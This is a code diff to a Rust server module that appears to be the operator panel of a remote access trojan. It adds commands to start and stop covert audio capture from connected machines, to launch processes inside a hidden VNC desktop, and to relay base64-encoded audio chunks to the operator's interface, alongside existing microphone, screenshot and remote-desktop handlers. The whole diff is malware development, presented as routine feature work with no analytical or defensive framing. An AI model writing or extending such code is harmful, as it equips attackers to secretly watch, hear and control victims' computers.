@@ -332,6 +332,16 @@ impl ServerWrapper {
                         .await;
                 }
 
+                StartRemoteDesktopAudio(addr) => {
+                    self.send_client_packet(&addr, ClientboundPacket::StartRemoteDesktopAudio)
+                        .await
+                }
+
+                StopRemoteDesktopAudio(addr) => {
+                    self.send_client_packet(&addr, ClientboundPacket::StopRemoteDesktopAudio)
+                        .await
+                }
+
                 RequestMicDevices(addr) => {
                     self.send_client_packet(&addr, ClientboundPacket::RequestMicDevices)
                         .await
@@ -459,8 +469,20 @@ impl ServerWrapper {
                             .await
                     }
                 }
+                StartHVNCFrameAudio(addr) => {
+                    self.send_client_packet(&addr, ClientboundPacket::StartHVNCFrameAudio)
+                        .await
+                }
+                StopHVNCFrameAudio(addr) => {
+                    self.send_client_packet(&addr, ClientboundPacket::StopHVNCFrameAudio)
+                        .await
+                }
                 OpenExplorer(addr) => {
                     self.send_client_packet(&addr, ClientboundPacket::OpenExplorer)
+                        .await
+                }
+                OpenHVNCProcess(addr, process_name) => {
+                    self.send_client_packet(&addr, ClientboundPacket::OpenHVNCProcess(process_name))
                         .await
                 }
 
@@ -530,6 +552,20 @@ impl ServerWrapper {
                     .await;
                 }
 
+                HVNCFrameAudioChunk(addr, chunk) => {
+                    self.emit_serde_payload(
+                        "hvnc_frame_audio_chunk",
+                        serde_json::json!({
+                            "addr": addr.to_string(),
+                            "timestamp": chunk.timestamp,
+                            "sampleRate": chunk.sample_rate,
+                            "channels": chunk.channels,
+                            "data": general_purpose::STANDARD.encode(&chunk.data),
+                        }),
+                    )
+                    .await;
+                }
+
                 ScreenshotData(addr, data) => {
                     if let Some(_client) = self.connected_users.get(&addr) {
                         self.emit_serde_payload(
@@ -576,6 +612,20 @@ impl ServerWrapper {
                             "timestamp": frame.timestamp,
                             "display": frame.display,
                             "data": general_purpose::STANDARD.encode(&frame.data),
+                        }),
+                    )
+                    .await;
+                }
+
+                RemoteDesktopAudioChunk(addr, chunk) => {
+                    self.emit_serde_payload(
+                        "remote_desktop_audio_chunk",
+                        serde_json::json!({
+                            "addr": addr.to_string(),
+                            "timestamp": chunk.timestamp,
+                            "sampleRate": chunk.sample_rate,
+                            "channels": chunk.channels,
+                            "data": general_purpose::STANDARD.encode(&chunk.data),
                         }),
                     )
                     .await;
